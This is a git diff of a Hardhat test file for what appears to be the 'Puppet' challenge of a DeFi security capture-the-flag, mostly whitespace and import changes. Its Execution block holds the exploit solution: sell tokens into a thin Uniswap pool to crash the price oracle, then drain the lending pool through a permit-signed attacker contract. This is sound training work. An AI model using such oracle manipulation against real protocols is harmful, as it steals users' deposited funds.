@@ -4,7 +4,6 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
-const { getContractAddress } = require('@ethersproject/address')
 const { signERC2612Permit } = require('eth-permit');
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
@@ -96,15 +95,19 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Execution', async function () {
+        
         // There is not much liquidity on Uniswap
         // We can sell all our tokens on Uniswap to manipulate the price
         // Then we can borrow all the tokens from the lending pool with a small collateral
         // To make it in one transaction, we use permit function of the token (ERC-2612)
+
         attackerFactory = await ethers.getContractFactory('PuppetPoolAttacker', player);
-        attackerAddress = getContractAddress({
+
+        attackerAddress = ethers.utils.getContractAddress({
             from: player.address,
             nonce: await player.getTransactionCount()
           });
+
         signature = await signERC2612Permit(
             player, 
             token.address, 
@@ -112,6 +115,7 @@ describe('[Challenge] Puppet', function () {
             attackerAddress, 
             PLAYER_INITIAL_TOKEN_BALANCE
         );        
+
         attacker = await attackerFactory.deploy(
             lendingPool.address, 
             signature.v,
@@ -120,6 +124,7 @@ describe('[Challenge] Puppet', function () {
             signature.deadline,
             {value: PLAYER_INITIAL_ETH_BALANCE*23n/25n, gasLimit: 10**6}
         );
+
     });
 
     after(async function () {
